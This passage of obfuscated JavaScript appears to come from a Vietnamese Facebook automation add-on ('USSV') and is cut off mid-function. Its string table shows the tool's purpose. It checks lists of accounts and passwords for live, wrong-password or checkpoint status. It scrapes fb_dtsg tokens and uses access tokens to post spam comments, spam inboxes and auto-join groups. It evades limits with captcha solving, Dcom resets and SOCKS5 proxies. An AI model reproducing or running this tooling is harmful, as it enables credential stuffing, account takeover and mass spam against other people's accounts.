        'Y5O': "key",
        'A3': function(W, V) {
            return W !== V;
        },
        'L2a': function(W, V) {
            return W == V;
        },
        'O8a': "Url",
        'Y9X': "&write=&readwrite=&extended=&social_confirm=&confirm=&seen_scopes=",
        'G1B': function(W, V) {
            return W == V;
        },
        's4b': function(W, V) {
            return W == V;
        },
        'Q0r': "pass",
        'Z22': function(W, V) {
            return W == V;
        },
        'H96': function(W, V) {
            return W < V;
        },
        'U8': function(W, V) {
            return W * V;
        },
        'w50': "Qu´a tri`nh ta?o Link trên Goo.gl thâ´t ba?i. Hê? thô´ng se~ du`ng Link ma?t di?nh.",
        'D9b': function(W, V) {
            return W == V;
        },
        'd1b': function(W, V) {
            return W == V;
        },
        't8Y': "l1t",
        'w7t': function(W, V) {
            return W < V;
        },
        'R4B': function(W, V) {
            return W == V;
        },
        's5B': function(W, V) {
            return W >= V;
        },
        'b0t': function(W, V) {
            return W < V;
        },
        'L5a': "picture",
        'z22': function(W, V) {
            return W == V;
        },
        'n2b': function(W, V) {
            return W == V;
        },
        'Y7Y': "Email",
        'X26': function(W, V) {
            return W == V;
        },
        'o8X': '<div class="class_viewimg">',
        'F30': 50,
        'S9E': function(W, V) {
            return W == V;
        },
        'p1B': function(W, V) {
            return W == V;
        },
        'A1E': function(W, V) {
            return W == V;
        },
        'v3I': '&access_token=',
        'P18': function(W, V) {
            return W == V;
        },
        'u3t': function(W, V) {
            return W < V;
        },
        'T8l': function(W, V) {
            return W == V;
        },
        't86': function(W, V) {
            return W < V;
        },
        'Q1a': function(W, V) {
            return W === V;
        },
        's40': "charAt",
        'F4Y': "#GroupCore_spam_content",
        'X1t': function(W, V) {
            return W == V;
        },
        'c5b': function(W, V) {
            return W == V;
        },
        'H2I': '<div class="div_title">',
        'Y90': 20,
        'e4Q': "&scroll_position=0",
        'B5Y': "width",
        'n16': function(W, V) {
            return W !== V;
        },
        'j0r': "#checking_page_",
        'D12': function(W, V) {
            return W == V;
        },
        'V3B': function(W, V) {
            return W == V;
        },
        'F4l': function(W, V) {
            return W <= V;
        },
        'G5Q': "#uss_vip",
        'y7v': "#Ussv_SpamCmt",
        'l6t': function(W, V) {
            return W == V;
        },
        'K5a': "&user_id=",
        'D7r': "Qu´a tri`nh Check bi? ngu`ng vi` co´ qua´ sô´ ta`i khoa?n bi? Checkpoint liên tu?c.",
        'i0b': function(W, V) {
            return W == V;
        },
        'r9Q': "#div_pnc_addon",
        'h4v': ".popup_menu_list.logs_get_acc",
        'i9t': function(W, V) {
            return W == V;
        },
        'c32': function(W, V) {
            return W == V;
        },
        'x4b': function(W, V) {
            return W !== V;
        },
        'I7E': function(W, V) {
            return W == V;
        },
        'X7t': function(W, V) {
            return W == V;
        },
        'J08': function(W, V) {
            return W - V;
        },
        'x2E': function(W, V) {
            return W == V;
        },
        'p4I': "disabled",
        'H78': function(W, V) {
            return W == V;
        },
        'I8l': function(W, V) {
            return W == V;
        },
        'd0Y': "._1ia",
        'q6b': function(W, V) {
            return W == V;
        },
        'h46': function(W, V) {
            return W == V;
        },
        'R02': function(W, V) {
            return W == V;
        },
        'n42': function(W, V) {
            return W == V;
        },
        'V8Y': ":",
        'U2a': function(W, V) {
            return W == V;
        },
        'Z8': function(W, V) {
            return W < V;
        },
        'Q0B': function(W, V) {
            return W == V;
        },
        'z5Y': '1',
        'z7l': function(W, V) {
            return W > V;
        },
        'Q57': "fn",
        'I66': function(W, V) {
            return W == V;
        },
        'm62': function(W, V) {
            return W === V;
        },
        'A2l': function(W, V) {
            return W > V;
        },
        'C06': function(W, V) {
            return W == V;
        },
        'I2l': function(W, V) {
            return W >= V;
        },
        'd1r': '&pass=',
        'O3B': function(W, V) {
            return W !== V;
        },
        'a58': function(W, V) {
            return W == V;
        },
        'u58': function(W, V) {
            return W == V;
        },
        't3l': function(W, V) {
            return W == V;
        },
        'p88': function(W, V) {
            return W == V;
        },
        'V1r': "<br/>",
        'j3O': "#div_ketqua_themacc",
        'g3v': "input[name$='mabimat']",
        'J58': function(W, V) {
            return W == V;
        },
        'h52': function(W, V) {
            return W == V;
        },
        'B3Q': "1",
        'q8': function(W, V) {
            return W * V;
        },
        'q2a': function(W, V) {
            return W === V;
        },
        'h5': function(W, V) {
            return W >= V;
        },
        'q8v': "for (;;);",
        'l90': "Ðang tiê´n ha`nh Spam la?i trên ta`i khoa?n ",
        'P07': " Ta`i Khoa?n liên tiê´p bi? Sai Pass<br/>",
        'r3': function(W, V) {
            return W !== V;
        },
        'N0v': "local",
        'A0l': function(W, V) {
            return W == V;
        },
        'h3r': "gender",
        'o9t': function(W, V) {
            return W == V;
        },
        'c88': function(W, V) {
            return W == V;
        },
        'f02': function(W, V) {
            return W == V;
        },
        'q10': "message",
        'c30': "rename",
        'W3': function(W, V) {
            return W == V;
        },
        'k2B': function(W, V) {
            return W == V;
        },
        'a0l': function(W, V) {
            return W !== V;
        },
        'p5b': function(W, V) {
            return W == V;
        },
        'b46': function(W, V) {
            return W - V;
        },
        'v7B': function(W, V) {
            return W == V;
        },
        'n10': 'user',
        'u6E': function(W, V) {
            return W == V;
        },
        'U4B': function(W, V) {
            return W == V;
        },
        'O68': function(W, V) {
            return W == V;
        },
        'r16': function(W, V) {
            return W !== V;
        },
        'n28': function(W, V) {
            return W == V;
        },
        'f9B': function(W, V) {
            return W == V;
        },
        'm26': function(W, V) {
            return W == V;
        },
        'x2B': function(W, V) {
            return W !== V;
        },
        'Y5B': function(W, V) {
            return W == V;
        },
        'B26': function(W, V) {
            return W == V;
        },
        'j7t': function(W, V) {
            return W == V;
        },
        't48': function(W, V) {
            return W < V;
        },
        'i08': function(W, V) {
            return W == V;
        },
        'c4v': "#uss_st_spam_need_fr_inbox_f",
        'w2I': "#uss_st_spam_delmsg_inbox",
        'I9Y': ".popup_menu_list.setting.dangky",
        'K3B': function(W, V) {
            return W == V;
        },
        'E5a': "fb_tools",
        'M32': function(W, V) {
            return W !== V;
        },
        'm50': "%26",
        'K5': function(W, V) {
            return W == V;
        },
        'V2I': "https://web.facebook.com",
        'Y2B': function(W, V) {
            return W == V;
        },
        'C6O': 'form',
        'I5I': 'name="fb_dtsg" value="(.*?)" autocomplete',
        'U9E': function(W, V) {
            return W == V;
        },
        'p3': function(W, V) {
            return W !== V;
        },
        'X8r': "Help: Vui lo`ng diê`n dâ`y du? Email va Ma~ Ki´ch hoa?t sau do´ Click Ki´ch Hoa?t",
        'W7B': function(W, V) {
            return W == V;
        },
        'f0t': function(W, V) {
            return W < V;
        },
        'D8E': function(W, V) {
            return W < V;
        },
        'D1a': function(W, V) {
            return W < V;
        },
        'E7E': function(W, V) {
            return W == V;
        },
        'L4B': function(W, V) {
            return W >= V;
        },
        'w9a': 7,
        'K6b': function(W, V) {
            return W == V;
        },
        'e1I': "Cmt_TB",
        'W7E': function(W, V) {
            return W == V;
        },
        'm8E': function(W, V) {
            return W !== V;
        },
        'N9B': function(W, V) {
            return W < V;
        },
        'J1X': '" id="spam_vl_',
        'W5y': "D7",
        'H7': function(W) {
            ussv_lang_vi_vl_pt_hight_live_75 = W;
        },
        'D4X': "08080808",
        'Q9Q': "#div_st_spam_inbox",
        'B12': function(W, V) {
            return W > V;
        },
        'w97': "friends",
        'g1t': function(W, V) {
            return W !== V;
        },
        'L8t': function(W, V) {
            return W !== V;
        },
        'Y9b': function(W, V) {
            return W < V;
        },
        'O7Q': "#uss_st_AutJoinGroup",
        'l4l': function(W, V) {
            return W == V;
        },
        'g8B': function(W, V) {
            return W == V;
        },
        'j0E': function(W, V) {
            return W == V;
        },
        'H2O': "Ðang ch? Reset Dcom (",
        'm2B': function(W, V) {
            return W == V;
        },
        'F72': function(W, V) {
            return W == V;
        },
        'C56': function(W, V) {
            return W == V;
        },
        'q96': function(W, V) {
            return W !== V;
        },
        'R3B': function(W, V) {
            return W == V;
        },
        'i0v': "gid",
        'F2O': "datapost",
        'y48': function(W, V) {
            return W == V;
        },
        'R82': function(W, V) {
            return W == V;
        },
        'H7b': function(W, V) {
            return W !== V;
        },
        'I7Q': "hometown",
        'm48': function(W, V) {
            return W == V;
        },
        'c1E': function(W, V) {
            return W >= V;
        },
        'P8O': 3000,
        'w3Q': "&",
        'L2v': "stellar.org",
        'B5O': '	<div style="border-top: 1px solid #e1e2e3;  margin: 0;">',
        'Q7t': function(W, V) {
            return W <= V;
        },
        'S52': function(W, V) {
            return W == V;
        },
        'X0E': function(W, V) {
            return W == V;
        },
        'K02': function(W, V) {
            return W == V;
        },
        'D5B': function(W, V) {
            return W == V;
        },
        'u4a': function(W, V) {
            return W == V;
        },
        'b10': "#uss_st_do_type",
        'n9Q': "#thong_check_die",
        'G1E': function(W, V) {
            return W == V;
        },
        'K8': function(W, V) {
            return W !== V;
        },
        'c9Q': "live",
        'i6v': "#uss_spam",
        'i5l': function(W, V) {
            return W == V;
        },
        'F3l': function(W, V) {
            return W == V;
        },
        'H7l': function(W, V) {
            return W == V;
        },
        'O82': function(W, V) {
            return W == V;
        },
        'c0l': function(W, V) {
            return W == V;
        },
        'C0B': function(W, V) {
            return W == V;
        },
        'F7v': "#thong_check_totalneed",
        'W88': function(W, V) {
            return W == V;
        },
        'g3l': function(W, V) {
            return W == V;
        },
        'k0v': "l2",
        'N2a': function(W, V) {
            return W == V;
        },
        'V8Q': "fb_dtsg=",
        'a0b': function(W, V) {
            return W == V;
        },
        'l9l': function(W, V) {
            return W > V;
        },
        'b17': '	</div>',
        't6': function(W, V) {
            return W == V;
        },
        'f8t': function(W, V) {
            return W == V;
        },
        'l48': function(W, V) {
            return W < V;
        },
        'n8X': "uss_st_lancheck",
        's0B': function(W, V) {
            return W == V;
        },
        'L7b': function(W, V) {
            return W == V;
        },
        'g2': function(W) {
            lang_vi_st_check_note_hengio = W;
        },
        'H3B': function(W, V) {
            return W == V;
        },
        'X38': function(W, V) {
            return W < V;
        },
        'I6E': function(W, V) {
            return W == V;
        },
        'w9Y': "'>",
        'J0l': function(W, V) {
            return W == V;
        },
        'o1E': function(W, V) {
            return W == V;
        },
        'P3B': function(W, V) {
            return W !== V;
        },
        'p9I': '" src="https://ussv.net/themes/img/app/log_view.png">',
        'r42': function(W, V) {
            return W == V;
        },
        'e16': function(W, V) {
            return W == V;
        },
        'b6y': "app",
        'e66': function(W, V) {
            return W == V;
        },
        'w4Q': 'Thêm ta`i khoa?n tha`nh công',
        'Q3l': function(W, V) {
            return W !== V;
        },
        'Q0I': "html",
        'r2X': ".class_view_thongke_check",
        'D17': "#div_thongbao",
        'G8b': function(W, V) {
            return W == V;
        },
        'I1X': "#uss_st_saipass",
        'f8X': "HolaList",
        'S18': function(W, V) {
            return W == V;
        },
        'b8': function(W, V) {
            return W < V;
        },
        'A42': function(W, V) {
            return W < V;
        },
        'h6l': function(W, V) {
            return W !== V;
        },
        'H2a': function(W, V) {
            return W <= V;
        },
        'e5b': function(W, V) {
            return W == V;
        },
        'L7Q': "2",
        'q9r': '        <div class="left">',
        'U6b': function(W, V) {
            return W == V;
        },
        'V8I': "fb_name",
        'Y3l': function(W, V) {
            return W == V;
        },
        'a9r': "getinfo",
        'C4y': "getElementById",
        'P02': function(W, V) {
            return W == V;
        },
        'G7v': "Group_Id",
        't8E': function(W, V) {
            return W == V;
        },
        'V6l': function(W, V) {
            return W == V;
        },
        'R70': "#uss_username",
        'e88': function(W, V) {
            return W <= V;
        },
        'F56': function(W, V) {
            return W == V;
        },
        'u66': function(W, V) {
            return W == V;
        },
        'l7Y': "Sô´ acc check qua´ i´ch nên không thê? tiê´n ha`nh phân ti´ch duo?c !",
        'f5I': "like",
        'v20': "Check",
        'J6B': function(W, V) {
            return W <= V;
        },
        'b7b': function(W, V) {
            return W == V;
        },
        'p6E': function(W, V) {
            return W == V;
        },
        'x3y': "match",
        'n88': function(W, V) {
            return W / V;
        },
        'h7l': function(W, V) {
            return W > V;
        },
        'q50': "Ta`i khoa?n na`y Live",
        'v2': function(W) {
            lang_vi_fb_parseLogin_timeout = W;
        },
        'C8v': "usskey",
        'o8b': function(W, V) {
            return W == V;
        },
        'S02': function(W, V) {
            return W == V;
        },
        'T7Q': 2000,
        'q0a': function(W, V) {
            return W == V;
        },
        'x5B': function(W, V) {
            return W == V;
        },
        'p2b': function(W, V) {
            return W < V;
        },
        'V8': function(W, V) {
            return W == V;
        },
        'd9B': function(W, V) {
            return W < V;
        },
        'i5Y': '.row_del_acc',
        'v66': function(W, V) {
            return W == V;
        },
        'j12': function(W, V) {
            return W < V;
        },
        'C2E': function(W, V) {
            return W == V;
        },
        'i0Q': '</option>',
        's9b': function(W, V) {
            return W == V;
        },
        'v5Y': ".ussv_log_panel_rsdcomfndn",
        'p5Y': "https://www.facebook.com/n/?notifications&mid=x46fdf8G5af4213825a3G0Gdx",
        'w62': function(W, V) {
            return W === V;
        },
        'C26': function(W, V) {
            return W == V;
        },
        'z60': "#id_ppa",
        'l0E': function(W, V) {
            return W === V;
        },
        'P22': function(W, V) {
            return W !== V;
        },
        't5v': "now",
        'H02': function(W, V) {
            return W !== V;
        },
        'v0l': function(W, V) {
            return W == V;
        },
        'y7': function(W) {
            ussv_lang_vi_vl_error_lognull = W;
        },
        'S6b': function(W, V) {
            return W == V;
        },
        'E16': function(W, V) {
            return W == V;
        },
        'I8Y': '/feed?access_token=',
        'c9y': "ajax",
        'J88': function(W, V) {
            return W == V;
        },
        'P8t': function(W, V) {
            return W == V;
        },
        'P46': function(W, V) {
            return W !== V;
        },
        'i3t': function(W, V) {
            return W == V;
        },
        'v58': function(W, V) {
            return W == V;
        },
        'r66': function(W, V) {
            return W <= V;
        },
        'l8a': "SpamCmt",
        'r28': function(W, V) {
            return W == V;
        },
        'P7b': function(W, V) {
            return W !== V;
        },
        'z5': function(W, V) {
            return W == V;
        },
        'S6a': "Vu`a hoa`n tha`nh Xo´a toa`n bô? Cookie vi` co´ 1 ta`i khoa?n bi? Sai Pass !",
        'm6O': "J2",
        'X56': function(W, V) {
            return W == V;
        },
        'c6v': "#uss_st_type_spam_inbox",
        'W4t': function(W, V) {
            return W == V;
        },
        'p7B': function(W, V) {
            return W < V;
        },
        'j2B': function(W, V) {
            return W == V;
        },
        'v88': function(W, V) {
            return W == V;
        },
        'z0a': function(W, V) {
            return W == V;
        },
        'H6b': function(W, V) {
            return W == V;
        },
        'w5O': '        <div class="right">',
        'd3v': "substr",
        'X9b': function(W, V) {
            return W !== V;
        },
        'k3l': function(W, V) {
            return W == V;
        },
        's72': function(W, V) {
            return W == V;
        },
        'I0O': "TransferGroups",
        'P4B': function(W, V) {
            return W == V;
        },
        'c8a': "USSVCLEAR",
        'L9E': function(W, V) {
            return W == V;
        },
        'I3t': function(W, V) {
            return W !== V;
        },
        'N8Y': "#uss_check_content",
        'D0Y': "#email",
        'W4a': function(W, V) {
            return W == V;
        },
        'a2Y': "decaptcha",
        'v2X': "Lô~i",
        'l2B': function(W, V) {
            return W !== V;
        },
        'K9E': function(W, V) {
            return W == V;
        },
        'c28': function(W, V) {
            return W > V;
        },
        'q3E': function(W, V) {
            return W == V;
        },
        'I5v': ".st.spam.wall.more",
        'f52': function(W, V) {
            return W * V;
        },
        'i1E': function(W, V) {
            return W == V;
        },
        'E97': "h2",
        'R8t': function(W, V) {
            return W == V;
        },
        'T5y': '    </div>',
        'w0E': function(W, V) {
            return W !== V;
        },
        'm72': function(W, V) {
            return W == V;
        },
        'W1B': function(W, V) {
            return W == V;
        },
        'a9y': "#uss_st_check_info",
        'X2O': "#imageLoad",
        'N36': function(W, V) {
            return W == V;
        },
        'z3I': "Cmt_TT",
        'N3y': "USSVCANCEL",
        'Q7': function(W, V) {
            return W == V;
        },
        'S7X': "a3",
        'z3E': function(W, V) {
            return W !== V;
        },
        'G08': function(W, V) {
            return W == V;
        },
        'G8y': "https://graph.facebook.com/me/subscribers?access_token=",
        'R68': function(W, V) {
            return W == V;
        },
        'q7l': function(W, V) {
            return W - V;
        },
        't67': "Tin nha´n không ho?p lê?...",
        'm07': "Error",
        'E0l': function(W, V) {
            return W == V;
        },
        'D5E': function(W, V) {
            return W - V;
        },
        'L46': function(W, V) {
            return W !== V;
        },
        's0r': "locale",
        'L0t': function(W, V) {
            return W !== V;
        },
        'h36': function(W, V) {
            return W == V;
        },
        'B6t': function(W, V) {
            return W !== V;
        },
        'I3a': "Z7",
        'q57': "on",
        'A08': function(W, V) {
            return W > V;
        },
        'K9a': 6,
        'P36': function(W, V) {
            return W == V;
        },
        'i6E': function(W, V) {
            return W == V;
        },
        'H18': function(W, V) {
            return W - V;
        },
        'X7r': "t9",
        'Y0E': function(W, V) {
            return W === V;
        },
        'V2t': function(W, V) {
            return W == V;
        },
        'c66': function(W, V) {
            return W == V;
        },
        'K87': "#div_pnc_right_ketqua",
        'x72': function(W, V) {
            return W == V;
        },
        'T16': function(W, V) {
            return W == V;
        },
        'P6l': function(W, V) {
            return W == V;
        },
        'l62': function(W, V) {
            return W == V;
        },
        'a42': function(W, V) {
            return W == V;
        },
        'b82': function(W, V) {
            return W == V;
        },
        'L8': function(W, V) {
            return W == V;
        },
        'w2y': "#uss_st_type_internet",
        'D2E': function(W, V) {
            return W == V;
        },
        'l8Q': "#spam_fl_",
        'd5': function(W, V) {
            return W == V;
        },
        'j5B': function(W, V) {
            return W >= V;
        },
        'c3': function(W, V) {
            return W !== V;
        },
        'R78': function(W, V) {
            return W == V;
        },
        'p8b': function(W, V) {
            return W === V;
        },
        'G4a': function(W, V) {
            return W == V;
        },
        'g7r': ".info_table",
        'r3t': function(W, V) {
            return W == V;
        },
        'I37': "Câ?p nhâ?t nô?i dung Spam tha`nh công.",
        'd47': " Lâ`n Hoa`n Tâ´t.",
        'i6r': "json",
        'f10': "f",
        'W2Y': ".setting_note_bottom",
        'X97': "VPNSocks5",
        'B0O': "popup_menu_list_select",
        'N7b': function(W, V) {
            return W - V;
        },
        'Q98': function(W, V) {
            return W <= V;
        },
        'E8a': ".div_Laning_AccList",
        'p8l': function(W, V) {
            return W == V;
        },
        'w3b': function(W, V) {
            return W == V;
        },
        'M28': function(W, V) {
            return W == V;
        },
        'C37': "setting",
        'a32': function(W, V) {
            return W == V;
        },
        'E28': function(W, V) {
            return W == V;
        },
        'U6l': function(W, V) {
            return W === V;
        },
        'I5l': function(W, V) {
            return W !== V;
        },
        'U0a': function(W, V) {
            return W == V;
        },
        'Z0t': function(W, V) {
            return W == V;
        },
        'l7y': "#stt_acc_check",
        'f22': function(W, V) {
            return W == V;
        },
        'Y2E': function(W, V) {
            return W == V;
        },
        'x7I': "indexOf",
        'u0b': function(W, V) {
            return W == V;
        },
        'V0O': "Ba?n không thê? su? du?ng ti´nh nang Ðang Nhâ?p Nhanh trong khi dang Check. Vui lo`ng cha´c cha´n USSV dang trong chê´ dô? nghi~ ngoi !",
        'd8v': 'background-image',
        'x40': "I7",
        'u0l': function(W, V) {
            return W == V;
        },
        'y06': function(W, V) {
            return W == V;
        },
        'r5l': function(W, V) {
            return W == V;
        },
        'R9B': function(W, V) {
            return W == V;
        },
        'O00': "FB_Key",
        'I2O': "USS",
        'o88': function(W, V) {
            return W == V;
        },
        'd77': 'input',
        't9r': 'user=hihjhhj2',
        'q3X': ".header",
        's3l': function(W, V) {
            return W === V;
        },
        'x6': function(W, V) {
            return W / V;
        },
        't1a': function(W, V) {
            return W == V;
        },
        'e8r': "Qu´a tri`nh dang nhâ?p thâ´t ba?i vi` da~ qua´ tho`i gian quy di?nh. Ha~y kiê?m tra la?i duo`ng truyê`n ma?ng...",
        'L0a': function(W, V) {
            return W == V;
        },
        'j87': "PanelMenu",
        'S7b': function(W, V) {
            return W !== V;
        },
        'Y72': function(W, V) {
            return W >= V;
        },
        'E1E': function(W, V) {
            return W !== V;
        },
        'r08': function(W, V) {
            return W == V;
        },
        'w2X': "a8",
        'x5O': ".php",
        'U00': "close",
        'j8E': function(W, V) {
            return W > V;
        },
        'C72': function(W, V) {
            return W == V;
        },
        'Y7v': 'Ðang nh?p thành công.',
        'E1B': function(W, V) {
            return W == V;
        },
        'z9B': function(W, V) {
            return W == V;
        },
        'O2a': function(W, V) {
            return W == V;
        },
        'A9': function(W) {
            ussv_lang_vi_nt_cant_fl = W;
        },
        'A32': function(W, V) {
            return W == V;
        },
        'm0r': ".ussv_logs_left_panel",
        'v9I': 'xs',
        'e0Y': "no",
        'o7B': function(W, V) {
            return W == V;
        },
        'r4Y': "ussv_username",
        'k8E': function(W, V) {
            return W < V;
        },
        'J57': "Ðang nhâ?p tha`nh công vui lo`ng cho` giây la´t...<br/>1 Tab mo´i se~ duo?c mo? ra ke`m theo ta`i khoa?n da~ dang nhâ?p sa~n !",
        'k4O': "hover",
        'N57': '<div id="acc_fn_',
        'l77': "&user=",
        'f5': function(W, V) {
            return W == V;
        },
        'j06': function(W, V) {
            return W == V;
        },
        'F8E': function(W, V) {
            return W == V;
        },
        'z27': "100003549365370",
        'c1Q': "#div_thongke_check",
        'x0B': function(W, V) {
            return W >= V;
        },
        'Y70': "USSV da~ co´ 1 ca´i nhi`n va` da´nh gia´ vê` tiê´n tri`nh Ðang Ba`i cu?a ba?n. Ha~y tham kha?o tiê´n tri`nh lâ`n sau cha?y tô´t hon.",
        'A0b': function(W, V) {
            return W < V;
        },
        'V0a': function(W, V) {
            return W !== V;
        },
        'q2Q': "ScanPostFQL",
        'I58': function(W, V) {
            return W == V;
        },
        'k4Q': "#uss_st_mp3alert",
        'P9E': function(W, V) {
            return W == V;
        },
        'T6B': function(W, V) {
            return W == V;
        },
        'K96': function(W, V) {
            return W !== V;
        },
        's1t': function(W, V) {
            return W == V;
        },
        'y8Y': '__CANCEL__',
        'h96': function(W, V) {
            return W == V;
        },
        'O7l': function(W, V) {
            return W < V;
        },
        'P96': function(W, V) {
            return W == V;
        },
        'a92': function(W, V) {
            return W < V;
        },
        'J4t': function(W, V) {
            return W !== V;
        },
        'h18': function(W, V) {
            return W == V;
        },
        'x38': function(W, V) {
            return W == V;
        },
        'U4v': "title",
        'c4y': "Ta`i khoa?n na`y Sai Pass",
        'z8t': function(W, V) {
            return W == V;
        },
        'g4b': function(W, V) {
            return W == V;
        },
        'S6Y': '/',
        'A0r': true,
        'Z46': function(W, V) {
            return W * V;
        },
        'e6B': function(W, V) {
            return W == V;
        },
        'd50': "&pass=",
        'b0O': "AccStt",
        'u28': function(W, V) {
            return W == V;
        },
        'E5b': function(W, V) {
            return W == V;
        },
        'Q06': function(W, V) {
            return W == V;
        },
        'f2t': function(W, V) {
            return W == V;
        },
        'R4X': "a2",
        'A6B': function(W, V) {
            return W == V;
        },
        'N0a': function(W, V) {
            return W == V;
        },
        'a8O': "#thong_check_live",
        'K1b': function(W, V) {
            return W !== V;
        },
        'u00': "k",
        'H8v': "responseText",
        'F8I': "Lô~i trong qua´ tri`nh xa´c thu?c ta`i khoa?n. Ma~ #1 !",
        'i77': "change",
        'e9O': "dom",
        'Z4B': function(W, V) {
            return W == V;
        },
        't4l': function(W, V) {
            return W == V;
        },
        'o1X': "#thong_check_total, #thongke_check_tc",
        'c6B': function(W, V) {
            return W !== V;
        },
        'v9Y': "all",
        'H82': function(W, V) {
            return W == V;
        },
        'e6I': "&ft_ent_identifier=",
        'A92': function(W, V) {
            return W == V;
        },
        'R6l': function(W, V) {
            return W == V;
        },
        'X48': function(W, V) {
            return W == V;
        },
        'R2X': "#popup_ussv_logs",
        'C8E': function(W, V) {
            return W == V;
        },
        'M7E': function(W, V) {
            return W == V;
        },
        'o1B': function(W, V) {
            return W - V;
        },
        'W47': "from",
        'L3a': "H7",
        'Z9E': function(W, V) {
            return W == V;
        },
        'c76': function(W, V) {
            return W !== V;
        },
        'e3r': "#btn_ussv_show_acclist",
        'I4t': function(W, V) {
            return W !== V;
        },
        'Y3X': "Co´ ve? qua´ tri`nh Spam cu?a ba?n diê~n ra Thuâ?n Lo?i, kê´t qua? tha`nh côn hon 80% ! Chu´c mu`ng Ba?n ! ",
        'h9E': function(W, V) {
            return W == V;
        },
        'S9a': 1,
        'k6t': function(W, V) {
            return W < V;
        },
        'y9b': function(W, V) {
            return W !== V;
        },
        'm12': function(W, V) {
            return W == V;
        },
        'X12': function(W, V) {
            return W >= V;
        },
        'n7': function(W) {
            ussv_lang_vi_vl_pt_hight_live_50 = W;
        },
        'B7': function(W) {
            ussv_lang_vi_log_die_clear_cookie = W;
        },
        'U1b': function(W, V) {
            return W == V;
        },
        'w8E': function(W, V) {
            return W === V;
        },
        'F50': "fadeOut",
        'm87': "errorDescription",
        'U7I': "&access_token=",
        'b1l': function(W, V) {
            return W == V;
        },
        'k3y': "rgba(213, 211, 211, 0.82)",
        'y72': function(W, V) {
            return W == V;
        },
        'M8O': "e7",
        'e4Y': "U_S",
        'j56': function(W, V) {
            return W !== V;
        },
        'O8': function(W, V) {
            return W == V;
        },
        'q60': "birthday",
        'p7E': function(W, V) {
            return W == V;
        },
        'c3t': function(W, V) {
            return W == V;
        },
        't6a': "Q7",
        'U5': function(W, V) {
            return W == V;
        },
        'D7a': "getElementsByTagName",
        'R5': function(W, V) {
            return W == V;
        },
        'y4X': " bi? Checkpoint<br/>",
        'b9B': function(W, V) {
            return W < V;
        },
        'u5l': function(W, V) {
            return W == V;
        },
        'u57': "Tùy ch?n Time ADD s? thi?t l?p cho ADD ON l?y tài kho?n du?c thêm vào h? th?ng khi nào. N?u b?n d? m?c d?nh thì quá trình Check s? theo th? t? t? c? d?n m?i. N?u d? Day:01 Month:01 Year:2015 thì h? th?ng s? dua ra danh sách các tài kho?n du?c thêm vào ? ngày 01 tháng 01 Nam 2015",
        'A3Y': "html/hJ.html",
        'Q0O': "Qu´a tri`nh Spam la?i thâ´t ba?i vi` Token trên ta`i khoa?n da~ bi? Die , không thê? su? du?ng !",
        'C67': "add_his",
        'C4b': function(W, V) {
            return W < V;
        },
        'z9E': function(W, V) {
            return W == V;
        },
        'r58': function(W, V) {
            return W == V;
        },
        'w9b': function(W, V) {
            return W !== V;
        },
        'p50': "getContext",
        't9': function(W) {
            ussv_lang_vi_cp_fl = W;
        },
        'y5B': function(W, V) {
            return W == V;
        },
        'R8v': "Like_Post",
        'T88': function(W, V) {
            return W == V;
        },
        'V0r': "body",
        'G92': function(W, V) {
            return W <= V;
        },
        'Z82': function(W, V) {
            return W == V;
        },
        'L4y': ".div_popup_text_loc_trung.ussv_logs_txt",
        'v76': function(W, V) {
            return W == V;
        },
        'U8y': '		<img title="Xem Li?ch Su? Ta`i Khoa?n ',
        'g2E': function(W, V) {
            return W == V;
        },
        'm4b': function(W, V) {
            return W == V;
        }
    };
    f1W.I0W = function(i) {
        while (i) return f1W.n5r.f5r(i);
    };
    f1W.g0W = function(b) {
        while (b) return f1W.n5r.c5r(b);
    };
    f1W.D0W = function(d) {
        for (; f1W;) return f1W.n5r.c5r(d);
    };
    f1W.h0W = function(a) {
        if (f1W && a) return f1W.n5r.c5r(a);
    };
    f1W.a0W = function(j) {
        if (f1W && j) return f1W.n5r.f5r(j);
    };
    f1W.f0W = function(f) {
        for (; f1W;) return f1W.n5r.c5r(f);
    };
    f1W.n0W = function(j) {
        while (j) return f1W.n5r.f5r(j);
    };
    f1W.s0W = function(a) {
        while (a) return f1W.n5r.c5r(a);
    };
    f1W.H0W = function(l) {
        if (f1W && l) return f1W.n5r.f5r(l);
    };
    f1W.M0W = function(d) {
        for (; f1W;) return f1W.n5r.c5r(d);
    };
    f1W.q0W = function(j) {
        if (f1W && j) return f1W.n5r.f5r(j);
    };
    f1W.X0W = function(l) {
        if (f1W && l) return f1W.n5r.c5r(l);
    };
    f1W.b0W = function(c) {
        while (c) return f1W.n5r.c5r(c);
    };
    f1W.p0W = function(l) {
        for (; f1W;) return f1W.n5r.f5r(l);
    };
    f1W.U0W = function(m) {
        if (f1W && m) return f1W.n5r.c5r(m);
    };
    f1W.o0W = function(c) {
        if (f1W && c) return f1W.n5r.f5r(c);
    };
    f1W.F0W = function(i) {
        for (; f1W;) return f1W.n5r.c5r(i);
    };
    f1W.Z0W = function(b) {
        while (b) return f1W.n5r.c5r(b);
    };
    f1W.r0W = function(e) {
        for (; f1W;) return f1W.n5r.f5r(e);
    };
    f1W.B0W = function(d) {
        if (f1W && d) return f1W.n5r.c5r(d);
    };
    f1W.O0W = function(m) {
        if (f1W && m) return f1W.n5r.f5r(m);
    };
    f1W.j0W = function(k) {
        for (; f1W;) return f1W.n5r.f5r(k);
    };
    f1W.V0W = function(l) {
        for (; f1W;) return f1W.n5r.c5r(l);
    };
    f1W.W0W = function(j) {
        if (f1W && j) return f1W.n5r.c5r(j);
    };
    f1W.G5r = function(k) {
        if (f1W && k) return f1W.n5r.c5r(k);
    };
    f1W.t5r = function(h) {
        while (h) return f1W.n5r.f5r(h);
    };
    f1W.v5r = function(i) {
        if (f1W && i) return f1W.n5r.c5r(i);
    };
    f1W.w5r = function(f) {
        for (; f1W;) return f1W.n5r.f5r(f);
    };
    f1W.L5r = function(c) {
        for (; f1W;) return f1W.n5r.f5r(c);
    };
    f1W.u5r = function(m) {
        for (; f1W;) return f1W.n5r.c5r(m);
    };
    f1W.x5r = function(g) {
        if (f1W && g) return f1W.n5r.c5r(g);
    };

    function HandlePopupFBLogin(W) {
        f1W.S5r = function(k) {
            if (f1W && k) return f1W.n5r.c5r(k);
        };
        var V = f1W.S5r("af") ? "T3t" : '%';
        $(f1W.o1Y)[f1W.v37]();
        $("#str_note_login_fb")[f1W.m8y](W[f1W.F5v]);
        if (f1W[V](W[f1W.C3y], f1W.S9a)) {
            str[f1W.e9O](f1W.c9a);
        }
    }

    function thaotac_safe_msg_chat() {
        f1W.C0W = function(a) {
            while (a) return f1W.n5r.c5r(a);
        };
        f1W.z0W = function(m) {
            for (; f1W;) return f1W.n5r.c5r(m);
        };
        f1W.N0W = function(b) {
